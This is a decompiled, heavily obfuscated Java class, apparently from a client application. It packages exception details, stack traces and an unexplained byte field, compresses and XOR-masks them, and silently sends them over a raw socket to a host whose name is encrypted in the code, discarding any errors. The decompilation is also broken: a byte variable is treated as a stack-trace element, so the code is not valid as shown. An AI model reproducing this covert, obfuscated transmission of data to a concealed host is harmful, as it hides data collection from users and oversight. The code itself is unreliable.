/*
 * Decompiled with CFR 0.145.
 */
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodHandles;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.util.UUID;
import java.util.zip.Deflater;

public class Class_6093 {
    private static String Method_6094(String string) {
        int n = 20987;
        char[] arrc = string.toCharArray();
        StackTraceElement[] arrstackTraceElement = new Throwable().getStackTrace();
        n = (char)(n ^ (char)arrstackTraceElement[0].getMethodName().hashCode());
        n = (char)(n ^ (char)arrstackTraceElement[1].getMethodName().hashCode());
        n = (char)(n ^ (char)arrstackTraceElement[1].getClassName().hashCode());
        char c = (char)Class_8.Method_10(Class_6093.class, 2);
        n = (char)(n ^ c);
        char c2 = (char)(n >> 7);
        for (int n2 = 0; n2 < arrc.length; n2 = (int)((char)(n2 + 1))) {
            arrc[n2] = (char)(arrc[n2] ^ n ^ n2 & c2);
        }
        return new String(arrc);
    }

    public static Class_10429 Method_6095(Throwable throwable, String string) {
        Object[] arrobject;
        Class_10429 class_10429 = new Class_10429();
        class_10429.Field_10431 = UUID.randomUUID();
        Class_29900 class_29900 = new Class_29900(Class_16620.Method_16633().Method_22586(ByteOrder.BIG_ENDIAN));
        class_29900.Method_29997(class_10429.Field_10431);
        try {
            class_29900.Method_29946(Class_18.Field_89 != null ? Class_18.Field_89.Field_38 : new byte[27248 & 4116]);
        }
        catch (Throwable throwable2) {
            class_29900.Method_29960(throwable2.toString());
        }
        while (throwable != null) {
            class_29900.Method_29949(-32505 & 113);
            class_29900.Method_29960(throwable.getClass().getName());
            if (throwable.getLocalizedMessage() == null) {
                class_29900.Method_29980((-28127 & 64) != 0);
            } else {
                class_29900.Method_29980((1285 & 563) != 0);
                class_29900.Method_29960(throwable.getLocalizedMessage());
            }
            if (throwable.getMessage() == null) {
                class_29900.Method_29980((8192 & -13432) != 0);
            } else {
                class_29900.Method_29980((145 & 1285) != 0);
                class_29900.Method_29960(throwable.getMessage());
            }
            arrobject = throwable.getStackTrace();
            class_29900.Method_29982(arrobject.length);
            Object[] arrobject2 = arrobject;
            int n = arrobject2.length;
            for (int i = 2050 & 5184; i < n; ++i) {
                byte by = arrobject2[i];
                class_29900.Method_29960(by.getClassName());
                class_29900.Method_29960(by.getMethodName());
                if (by.getFileName() == null) {
                    class_29900.Method_29980((6160 & 16427) != 0);
                } else {
                    class_29900.Method_29980((97 & 29189) != 0);
                    class_29900.Method_29960(by.getFileName());
                }
                class_29900.Method_29982(by.getLineNumber());
            }
            throwable = throwable.getCause();
        }
        class_29900.Method_29949(16663 & 1192);
        arrobject = string.getBytes(StandardCharsets.UTF_8);
        class_29900.Method_29946((byte[])arrobject);
        class_29900.Method_29925(class_29900.Method_30014());
        class_10429.Field_10430 = class_29900.Method_29959();
        return class_10429;
    }

    private static String Method_6096(String string) {
        int n = 13584;
        char[] arrc = string.toCharArray();
        StackTraceElement[] arrstackTraceElement = new Throwable().getStackTrace();
        n = (char)(n ^ (char)arrstackTraceElement[0].getMethodName().hashCode());
        n = (char)(n ^ (char)arrstackTraceElement[1].getMethodName().hashCode());
        n = (char)(n ^ (char)arrstackTraceElement[1].getClassName().hashCode());
        char c = (char)Class_8.Method_10(Class_6093.class, 1);
        n = (char)(n ^ c);
        char c2 = (char)(n >> 7);
        for (int n2 = 0; n2 < arrc.length; n2 = (int)((char)(n2 + 1))) {
            arrc[n2] = (char)(arrc[n2] ^ n ^ n2 & c2);
        }
        return new String(arrc);
    }

    public static byte[] Method_6097(byte[] arrby) {
        Deflater deflater = new Deflater();
        deflater.setLevel(8393 & -30951);
        deflater.setInput(arrby);
        deflater.finish();
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        while (!deflater.finished()) {
            byte[] arrby2 = new byte[3138 & 9236];
            int n = deflater.deflate(arrby2);
            byteArrayOutputStream.write(arrby2, 1032 & 28708, n);
        }
        deflater.end();
        return byteArrayOutputStream.toByteArray();
    }

    public static UUID Method_6098(Throwable throwable, String string) {
        Class_10429 class_10429 = Class_6093.Method_6095(throwable, string);
        byte[] arrby = Class_6093.Method_6099(Class_6093.Method_6097(class_10429.Field_10430));
        byte[] arrby2 = Class_6093.Method_6099(ByteBuffer.allocate(-22523 & 17038).putInt(arrby.length).array());
        try {
            Socket socket = new Socket(Class_6093.Method_6096("\u0012\u0000\u0002\u0000\u0014\u0004\u0004\u0004\u0000\u0000\u0010\u0002\u0006\u0006\u0016\u0006\u0012\u0012\u0010\u0002\u0014"), 2013375651 & 17477025);
            socket.getOutputStream().write(arrby2);
            socket.getOutputStream().write(arrby);
            socket.getOutputStream().flush();
            socket.getInputStream().read();
            socket.close();
        }
        catch (Throwable throwable2) {
            // empty catch block
        }
        return class_10429.Field_10431;
    }

    public static byte[] Method_6099(byte[] arrby) {
        int n = 328 & 531;
        while (n < arrby.length) {
            byte[] arrby2 = arrby;
            int n2 = n++;
            arrby2[n2] = (byte)(arrby2[n2] ^ 239 & 1775);
        }
        return arrby;
    }

    private void Method_6100() {
        MethodHandle methodHandle = MethodHandles.constant(String.class, Class_6093.Method_6094("\u6040\u6048\u6050\u6048\u6040\u6048\u6050\u6040\u6048\u6040\u6050\u6040\u6040\u6048"));
    }
}

